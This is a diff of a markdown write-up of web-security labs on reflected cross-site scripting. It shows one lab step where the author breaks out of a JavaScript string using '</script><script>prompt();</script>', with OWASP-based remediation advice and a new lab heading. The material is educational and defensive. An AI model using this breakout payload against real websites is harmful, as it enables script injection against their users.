-4. Then I discover that the angle bracket isn’t escaped, so I close the existing tag with `</script>` and insert a new one `<script>prompt();</script>`. A popup then displays my message.
+  4. Then I discover that the angle bracket isn’t escaped, so I close the existing tag with `</script>` and insert a new one `<script>prompt();</script>`. A popup then displays my message.
 
-   ```javascript
-   <script>
-     var searchTerms = '</script><script>prompt("Am I vulnerable to XSS");</script>
-     ';document.write('
-   ```
+     ```javascript
+     <script>
+       var searchTerms = '</script><script>prompt("Am I vulnerable to XSS");</script>
+       ';document.write('
+     ```
    
-**Suggestion**: Validate and sanitize user input on client side to reject or clean inputs containing malicious characters or script tags. When inserting user input into JS strings, use [output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) that safely escapes all special characters that could break the context, not just single quotes and backslashes. Don't place variables into [dangerous contexts](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) as even with output encoding. Implement [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) that limits the sources and inline script execution. 
+  **Suggestion**: Validate and sanitize user input on client side to reject or clean inputs containing malicious characters or script tags. When inserting user input into JS strings, use [output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) that safely escapes all special characters that could break the context, not just single quotes and backslashes. Don't place variables into [dangerous contexts](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) as even with output encoding. Implement [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) that limits the sources and inline script execution. 
 
-</details>
--
+  </details>
+  -
+
+  _**9. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**_
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
+
 
 </details>
 
